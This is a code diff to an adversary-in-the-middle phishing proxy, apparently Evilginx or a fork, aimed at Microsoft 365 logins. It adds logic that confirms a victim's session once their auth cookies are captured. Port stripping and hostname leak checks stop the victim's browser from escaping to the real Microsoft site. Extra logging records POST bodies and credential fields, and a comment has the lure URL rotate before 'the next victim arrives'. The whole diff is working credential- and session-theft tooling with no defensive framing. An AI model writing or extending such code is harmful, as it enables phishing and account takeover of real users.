@@ -917,7 +917,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
 						req.ContentLength = int64(len(body))
 
-						log.Debug("POST: %s", req.URL.Path)
+						log.Debug("POST: %s https://%s%s", req.Method, strings.ToLower(req.Host), req.URL.Path)
 						log.Debug("POST body = %s", body)
 
 						contentType := req.Header.Get("Content-type")
@@ -1012,7 +1012,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							trigger = 0
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
-								log.Debug("POST: %s", req.URL.Path)
+								log.Debug("POST: %s https://%s%s", req.Method, strings.ToLower(req.Host), req.URL.Path)
 
 								for k, v := range req.PostForm {
 									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
@@ -1132,7 +1132,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								// submitted (some auth_urls are subresources of the
 								// login page), so only call it authenticated when
 								// there is real evidence.
-								p.markAuthenticated(ps.SessionId, s.Password != "" || s.AllCookieAuthTokensCaptured(pl.cookieAuthTokens))
+								evidenced, reason := p.authEvidence(s, pl)
+								if !evidenced {
+									log.Debug("session %s not authenticated yet: %s", ps.SessionId, reason)
+								}
+								p.markAuthenticated(ps.SessionId, evidenced)
 								break
 							}
 						}
@@ -1231,6 +1235,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// (the phished host is not a valid lure path and has no session yet).
 			is_unauth_redirect := resp.Header.Get("X-UnAuth-Redirect") == "1"
 			resp.Header.Del("X-UnAuth-Redirect")
+			if r_url, err := resp.Location(); err == nil {
+				_, matched := p.replaceHostWithPhished(r_url.Host)
+				log.Debug("locrewrite: req_host=%s status=%d loc=%s matched=%v unauth=%v scanner=%v",
+					req_hostname, resp.StatusCode, r_url.String(), matched, is_unauth_redirect, isScannerUA(resp.Request.UserAgent()))
+			}
 			if !is_unauth_redirect && !isScannerUA(resp.Request.UserAgent()) {
 				r_url, err := resp.Location()
 				if err == nil {
@@ -1306,6 +1315,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Header.Add("Set-Cookie", ck.String())
 			}
 
+			// Evidence is evaluated here, after this response's Set-Cookie has been
+			// applied: the completion response is often the very one that carries
+			// the session-auth cookie. Being evidence-driven (rather than waiting
+			// for a marker URL) means a login that never touches an auth_url still
+			// becomes usable the moment its cookies are complete.
+			if pl != nil && ps.SessionId != "" {
+				if s, ok := p.sessions[ps.SessionId]; ok {
+					if evidenced, reason := p.authEvidence(s, pl); evidenced {
+						if s.Stage < database.StageAuthenticated {
+							if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
+								log.Error("database: %v", err)
+							}
+						}
+						p.markAuthenticated(ps.SessionId, true)
+					} else if s.IsDone {
+						log.Debug("session %s not authenticated yet: %s", ps.SessionId, reason)
+					}
+				}
+			}
+
 			body, err := io.ReadAll(resp.Body)
 
 			if pl != nil {
@@ -1362,7 +1391,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("database: %v", err)
 						}
 						s.Finish(false)
-						p.markAuthenticated(ps.SessionId, s.Password != "" || s.AllCookieAuthTokensCaptured(auth_tokens))
+						evidenced, reason := p.authEvidence(s, pl)
+						if !evidenced {
+							log.Debug("session %s not authenticated yet: %s", ps.SessionId, reason)
+						}
+						p.markAuthenticated(ps.SessionId, evidenced)
 						// Immediately rotate the autolure path so the captured URL
 						// is burned and replaced before the next victim arrives.
 						if s.PhishLure != nil && s.PhishLure.AutoRotate {
@@ -1460,7 +1493,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 
 									if re, err := regexp.Compile(re_s); err == nil {
-										body = []byte(re.ReplaceAllString(string(body), replace_s))
+										nb := re.ReplaceAllString(string(body), replace_s)
+										if nb != string(body) {
+											log.Debug("subfilter: host=%s search=%q replace=%q applied(len %d->%d)", req_hostname, sf.regexp, replace_s, len(body), len(nb))
+										}
+										body = []byte(nb)
 									} else {
 										log.Error("regexp failed to compile: `%s`", sf.regexp)
 									}
@@ -1478,6 +1515,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 						}
 						body = []byte(removeObfuscatedDots(string(body)))
+					}
+				}
+
+				// Diagnostic for the class of bug that let the browser escape mid-flow:
+				// a real Microsoft hostname that survived every rewrite. It fires only
+				// when something actually matched, so most responses log one line.
+				if pl != nil && ps.SessionId != "" {
+					reLeak := regexp.MustCompile(`[A-Za-z0-9._-]*(microsoftonline\.com|cloud\.microsoft|office\.com|microsoft365\.com)`)
+					if ms := reLeak.FindAllString(string(body), 6); len(ms) > 0 {
+						log.Debug("leakcheck: host=%s path=%s status=%d mime=%q found=%v",
+							req_hostname, resp.Request.URL.Path, resp.StatusCode, mime, ms)
 					}
 				}
 
@@ -2272,6 +2320,45 @@ func (p *HttpProxy) promoteStage(sid string, stage int) {
 	}
 }
 
+// authEvidence decides whether a login is genuinely confirmed, and says why not.
+//
+// Cookie evidence is authoritative: the phishlet's declared auth tokens must be
+// present for every domain we have actually seen. A password alone is supporting
+// evidence only - it says the form was submitted, not that the provider accepted
+// it. Phishlets that declare no auth tokens fall back to password + the
+// provider's own completion signal.
+func (p *HttpProxy) authEvidence(s *Session, pl *Phishlet) (bool, string) {
+	if s == nil {
+		return false, "no session"
+	}
+	if pl != nil {
+		declared := 0
+		for _, v := range pl.cookieAuthTokens {
+			for _, at := range v {
+				if !at.optional {
+					declared++
+				}
+			}
+		}
+		if declared > 0 {
+			// A session that has not yet reached any declared domain has an empty
+			// missing set, so it must also be shown to have captured something.
+			if !s.HasAnyCookieAuthToken(pl.cookieAuthTokens) {
+				return false, "no declared auth cookies captured yet"
+			}
+			missing := s.MissingCookieAuthTokens(pl.cookieAuthTokens)
+			if len(missing) > 0 {
+				return false, "missing auth cookies: " + missingSummary(missing)
+			}
+			return true, "declared auth cookies captured"
+		}
+	}
+	if s.Password != "" {
+		return true, "phishlet declares no auth cookies; password + provider confirmation"
+	}
+	return false, "no auth cookies declared and no password captured"
+}
+
 // markAuthenticated promotes to the final stage only when the login is evidenced.
 func (p *HttpProxy) markAuthenticated(sid string, evidenced bool) {
 	if !evidenced {
@@ -2472,6 +2559,20 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 	return hostname, false
 }
 
+// stripHostPort removes an explicit ":port" suffix. Microsoft emits Locations
+// such as "https://m365.cloud.microsoft:443/login"; the phishlet declares the
+// host without a port, so a port would otherwise defeat every host rewrite and
+// let the browser escape to the real site mid-flow.
+func stripHostPort(host string) string {
+	if host == "" {
+		return host
+	}
+	if h, _, err := net.SplitHostPort(host); err == nil && h != "" {
+		return h
+	}
+	return host
+}
+
 func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 	if hostname == "" {
 		return hostname, false
@@ -2481,6 +2582,7 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 		prefix = "."
 		hostname = hostname[1:]
 	}
+	hostname = stripHostPort(hostname)
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
